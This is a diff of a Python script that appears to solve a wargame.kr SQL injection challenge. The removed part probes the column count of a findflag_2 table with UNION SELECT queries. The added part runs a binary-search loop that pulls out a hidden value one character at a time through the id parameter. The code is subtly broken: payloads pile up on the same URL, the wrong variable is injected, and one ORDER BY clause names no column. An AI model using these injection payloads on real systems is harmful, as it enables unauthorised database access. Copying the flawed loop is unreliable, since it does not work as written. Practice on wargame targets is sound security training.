@@ -1,29 +1,28 @@
 from requests import *
-from urllib import parse
-'''
-url='http://wargame.kr:8080/zairo?pw=&flag=abs&id=\' union select 1'
-#findflag_2 테이블 속성 갯수 및 id 속성의 순서
-for i in range(1,10):
-    if i != 1:
-        url+=f',{i}'
-    url2=url+'%23'
-    response=get(url=url2)
-    if response.text.find('Hello') != -1:
-        print('findflag_2의 속성 갯수:',i)
-        print(response.text)
-
-url='http://wargame.kr:8080/zairo?pw=&flag=abs&id=\' or 1 order by 5 %23'
-response=get(url=url)
-print(response.text)
-
-url='http://wargame.kr:8080/zairo?pw=,3,4,5 %23&flag=abs&id=\' union select 1,'
-response=get(url=url)
-print(response.text)
-
-url='http://wargame.kr:8080/zairo?pw=&flag=abs&id=\' union select 1,xvvcPw4coaa1sslfe,3,4,5 from findflag_2 %23'
-response=get(url=url)
-print(response.text)
-'''
-url=f'http://wargame.kr:8080/zairo?pw=&flag=abs&id=\' union select * from findflag_2 union select 1,2,3,\'n\',5 order by 4 asc %23'  
-response=get(url=url)
-print(response.text)
+url='http://wargame.kr:8080/zairo?pw=&flag=abs&id=zairowkdlfhdkel\''
+start=33
+end=90
+pivot=int((90+33)/2)
+result=''
+test=''
+for i in range(30):
+    for j in range(8):
+        test=result+chr(pivot)
+        payload=f' union select 1,2,3,{result},5 order by asc %23'
+        url+=payload
+        response=get(url=url)
+        if response.text.find('2') != -1:
+            start=pivot+1
+            pivot=int((start+end)/2)
+        else:
+            end=pivot
+            pivot=int((start+end)/2)
+        if start==end:
+            result+=chr(start)
+            print(result)
+            start=33
+            end=90
+            pivot=int((90+33)/2)
+            break
+result=result.lower()
+print(result)
